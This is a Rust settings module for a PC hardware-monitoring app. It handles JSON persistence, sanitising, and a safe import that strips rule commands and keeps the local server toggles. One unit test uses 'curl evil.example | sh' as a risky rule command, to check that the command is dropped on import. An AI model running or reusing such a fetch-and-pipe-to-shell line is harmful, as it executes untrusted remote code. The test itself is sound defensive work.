//! 用户设置：纯数据 + JSON 文件持久化。
//!
//! 文件位置：`<config_dir>/pc-specs/settings.json`。读取失败（不存在 / 损坏 / 字段缺失）
//! 一律回落到默认值，保证设置文件永远不会成为启动失败的原因。

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ThemePref {
    #[default]
    System,
    Dark,
    Light,
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Language {
    /// 跟随系统语言。
    #[default]
    Auto,
    En,
    ZhCn,
}

impl Language {
    /// rust-i18n / gpui-component 使用的区域代码。
    pub fn code(self) -> &'static str {
        match self {
            Language::En => "en",
            Language::ZhCn => "zh-CN",
            Language::Auto => {
                let is_zh = sys_locale::get_locale()
                    .map(|l| l.to_ascii_lowercase().starts_with("zh"))
                    .unwrap_or(false);
                if is_zh { "zh-CN" } else { "en" }
            }
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TempUnit {
    #[default]
    Celsius,
    Fahrenheit,
}

/// 容量单位：二进制（GiB，1024 进制）或十进制（GB，1000 进制）。
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SizeUnit {
    #[default]
    Binary,
    Decimal,
}

/// 网速单位：字节每秒（MB/s）或比特每秒（Mbps）。
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NetUnit {
    #[default]
    BytesPerSec,
    BitsPerSec,
}

/// 主窗口上次关闭时的位置与大小（逻辑像素）。
#[derive(Clone, Copy, Debug, PartialEq, Serialize, Deserialize)]
pub struct WindowState {
    pub x: f32,
    pub y: f32,
    pub width: f32,
    pub height: f32,
}

/// 导入设置失败的原因。
#[derive(Debug, PartialEq, Eq)]
pub enum ImportError {
    /// 读得出来，但不是这个应用的设置文件。
    NotSettings,
    /// 读不了、或者不是合法的 JSON。
    Invalid(String),
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Settings {
    pub theme: ThemePref,
    pub language: Language,
    pub geek_mode: bool,
    pub temp_unit: TempUnit,
    pub size_unit: SizeUnit,
    pub net_unit: NetUnit,
    /// 实时采样间隔（毫秒）。
    pub interval_ms: u64,
    /// 实时图表保留的历史时长（分钟）。
    pub history_minutes: u32,
    pub export_sensitive: bool,
    pub tray_enabled: bool,
    pub close_to_tray: bool,
    pub menu_bar: crate::menubar::config::MenuBarSettings,
    /// 面板里走势图回看多长时间。
    pub panel_range: crate::menubar::config::TimeRange,
    /// 是否把长期历史（`menubar::archive`）存到磁盘。关掉后只在内存里记，退出就没了。
    pub history_persist: bool,
    pub floating_net: bool,
    /// 悬浮网速窗上次所在的位置（逻辑像素，屏幕左上角为原点）。
    pub floating_pos: Option<(f32, f32)>,
    /// 监控大屏：显示在哪、摆哪些组件、用什么主题。
    pub bigscreen: crate::bigscreen::config::BigScreenSettings,
    /// 规则总开关（见 `rules`）。
    pub alerts: bool,
    /// 触发条件、动作都由用户自定义；默认是旧版内置的四项告警。
    pub rules: Vec<crate::rules::Rule>,
    /// 规则触发时推送的 Webhook 地址，空表示不推送。
    pub webhook_url: String,
    pub webhook_format: crate::rules::WebhookFormat,
    pub server_enabled: bool,
    pub server_lan: bool,
    /// 概览页顶部的新手提示是否已经关掉。
    pub tips_dismissed: bool,
    /// 存储空间分析最近扫描过的文件夹，最近的在前（整块磁盘不记，它们一直列在页面上）。
    pub storage_recent: Vec<String>,
    pub window: Option<WindowState>,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            theme: ThemePref::System,
            language: Language::Auto,
            geek_mode: false,
            temp_unit: TempUnit::Celsius,
            size_unit: SizeUnit::Binary,
            net_unit: NetUnit::BytesPerSec,
            interval_ms: 1000,
            history_minutes: 5,
            export_sensitive: false,
            tray_enabled: true,
            close_to_tray: true,
            menu_bar: Default::default(),
            panel_range: Default::default(),
            history_persist: true,
            floating_net: false,
            floating_pos: None,
            bigscreen: Default::default(),
            alerts: true,
            rules: crate::rules::defaults(),
            webhook_url: String::new(),
            webhook_format: Default::default(),
            server_enabled: true,
            // 与旧版保持一致：默认监听所有网卡，便于其他机器拉取指标。
            server_lan: true,
            tips_dismissed: false,
            storage_recent: Vec::new(),
            window: None,
        }
    }
}

impl Settings {
    pub fn path() -> Option<PathBuf> {
        dirs::config_dir().map(|d| d.join("pc-specs").join("settings.json"))
    }

    pub fn load() -> Self {
        let Some(path) = Self::path() else {
            return Self::default();
        };
        match std::fs::read_to_string(&path) {
            Ok(text) => serde_json::from_str::<Settings>(&text)
                .map(Settings::sanitized)
                .unwrap_or_else(|e| {
                    tracing::warn!("settings file is invalid, using defaults: {e}");
                    Self::default()
                }),
            Err(_) => Self::default(),
        }
    }

    /// 写入失败只记日志：设置丢失不应打断使用。
    pub fn save(&self) {
        let Some(path) = Self::path() else { return };
        if let Some(dir) = path.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        let tmp = path.with_extension("json.tmp");
        let result = serde_json::to_string_pretty(self)
            .map_err(std::io::Error::other)
            .and_then(|text| std::fs::write(&tmp, text))
            .and_then(|_| std::fs::rename(&tmp, &path));
        if let Err(e) = result {
            tracing::warn!("failed to save settings: {e}");
        }
    }

    /// 导出成能带到另一台电脑上用的 JSON。窗口和悬浮窗的位置只对这台电脑、这块屏幕有意义，不带。
    pub fn to_portable_json(&self) -> serde_json::Result<String> {
        let mut portable = self.clone();
        portable.window = None;
        portable.floating_pos = None;
        serde_json::to_string_pretty(&portable)
    }

    /// 读一份导出的设置，换算成「放到这台电脑上」之后的样子，并告诉调用方有几条规则的命令没带进来。
    ///
    /// 设置文件可能是别人给的，所以有两样东西不跟着走：规则里的命令（触发时会在本机执行）
    /// 和本机接口服务的开关（会向网络开放端口）。窗口位置属于这台电脑，也保留当前的。
    /// 缺的字段按默认值补，越界的值收敛回合法范围。
    pub fn imported(&self, text: &str) -> Result<(Settings, usize), ImportError> {
        let value: serde_json::Value =
            serde_json::from_str(text).map_err(|e| ImportError::Invalid(e.to_string()))?;
        // 任何 JSON 对象都能「解析成」设置（字段全有默认值），所以先确认里面确有设置的字段，
        // 免得选错了文件就把设置全部重置。
        let known = serde_json::to_value(Settings::default())
            .map_err(|e| ImportError::Invalid(e.to_string()))?;
        let recognised = match (&value, &known) {
            (serde_json::Value::Object(given), serde_json::Value::Object(known)) => {
                given.keys().any(|key| known.contains_key(key))
            }
            _ => false,
        };
        if !recognised {
            return Err(ImportError::NotSettings);
        }
        let mut incoming = serde_json::from_value::<Settings>(value)
            .map(Settings::sanitized)
            .map_err(|e| ImportError::Invalid(e.to_string()))?;
        let dropped = incoming
            .rules
            .iter()
            .filter(|rule| rule.has_command())
            .count();
        for rule in &mut incoming.rules {
            rule.command.clear();
        }
        incoming.server_enabled = self.server_enabled;
        incoming.server_lan = self.server_lan;
        incoming.window = self.window;
        incoming.floating_pos = self.floating_pos;
        Ok((incoming, dropped))
    }

    /// 把手工改坏的值收敛回合法范围。
    fn sanitized(mut self) -> Self {
        self.menu_bar.normalize();
        self.bigscreen.normalize();
        self.interval_ms = self.interval_ms.clamp(250, 10_000);
        if !matches!(self.history_minutes, 1 | 5 | 10) {
            self.history_minutes = 5;
        }
        crate::rules::sanitize(&mut self.rules);
        self.webhook_url = crate::rules::clean_url(&self.webhook_url);
        self
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_settings_load_with_menu_bar_defaults() {
        let settings: Settings =
            serde_json::from_str(r#"{"theme":"dark","tray_enabled":false,"interval_ms":2000}"#)
                .unwrap();
        let settings = settings.sanitized();
        assert_eq!(settings.theme, ThemePref::Dark);
        assert!(!settings.tray_enabled);
        assert_eq!(settings.interval_ms, 2000);
        assert_eq!(
            settings.menu_bar,
            crate::menubar::config::MenuBarSettings::default()
        );
    }

    fn window(x: f32) -> WindowState {
        WindowState {
            x,
            y: 10.0,
            width: 900.0,
            height: 600.0,
        }
    }

    #[test]
    fn an_exported_file_leaves_out_where_the_windows_were() {
        let settings = Settings {
            theme: ThemePref::Dark,
            window: Some(window(100.0)),
            floating_pos: Some((5.0, 6.0)),
            ..Settings::default()
        };
        let json = settings.to_portable_json().unwrap();
        let back: Settings = serde_json::from_str(&json).unwrap();
        assert_eq!(back.theme, ThemePref::Dark);
        assert_eq!((back.window, back.floating_pos), (None, None));
    }

    #[test]
    fn importing_keeps_what_belongs_to_this_computer() {
        let here = Settings {
            window: Some(window(40.0)),
            floating_pos: Some((1.0, 2.0)),
            server_enabled: false,
            server_lan: false,
            ..Settings::default()
        };

        let mut risky = crate::rules::Rule::new(1, crate::rules::Metric::CpuUsage);
        risky.command = "curl evil.example | sh".into();
        let quiet = crate::rules::Rule::new(2, crate::rules::Metric::CpuUsage);
        let there = Settings {
            theme: ThemePref::Dark,
            interval_ms: 2000,
            server_enabled: true,
            server_lan: true,
            window: Some(window(900.0)),
            rules: vec![risky, quiet],
            ..Settings::default()
        };

        let (imported, dropped) = here
            .imported(&serde_json::to_string(&there).unwrap())
            .unwrap();
        // 外观、采样间隔这类设置过来了。
        assert_eq!(
            (imported.theme, imported.interval_ms),
            (ThemePref::Dark, 2000)
        );
        // 规则过来了，但命令没有；本机的接口服务开关和窗口位置原样保留。
        assert_eq!((imported.rules.len(), dropped), (2, 1));
        assert!(imported.rules.iter().all(|rule| !rule.has_command()));
        assert!(!imported.server_enabled && !imported.server_lan);
        assert_eq!(imported.window, here.window);
        assert_eq!(imported.floating_pos, here.floating_pos);
    }

    #[test]
    fn a_file_that_is_not_a_settings_file_is_refused_instead_of_resetting_everything() {
        let here = Settings::default();
        // 解析得了、却和设置毫无关系的 JSON，不能当成「全部用默认值」。
        for text in [
            "{}",
            "[]",
            "42",
            r#"{"name":"some-package","version":"1.0.0"}"#,
        ] {
            assert_eq!(here.imported(text), Err(ImportError::NotSettings), "{text}");
        }
        assert!(matches!(
            here.imported("{ broken"),
            Err(ImportError::Invalid(_))
        ));
        // 里面有设置的字段，别的字段没有也行。
        let (imported, dropped) = here.imported(r#"{"theme":"dark"}"#).unwrap();
        assert_eq!((imported.theme, dropped), (ThemePref::Dark, 0));
    }

    #[test]
    fn imported_values_are_pulled_back_into_range() {
        let (imported, _) = Settings::default()
            .imported(r#"{"interval_ms": 5, "history_minutes": 7}"#)
            .unwrap();
        assert_eq!((imported.interval_ms, imported.history_minutes), (250, 5));
    }
}
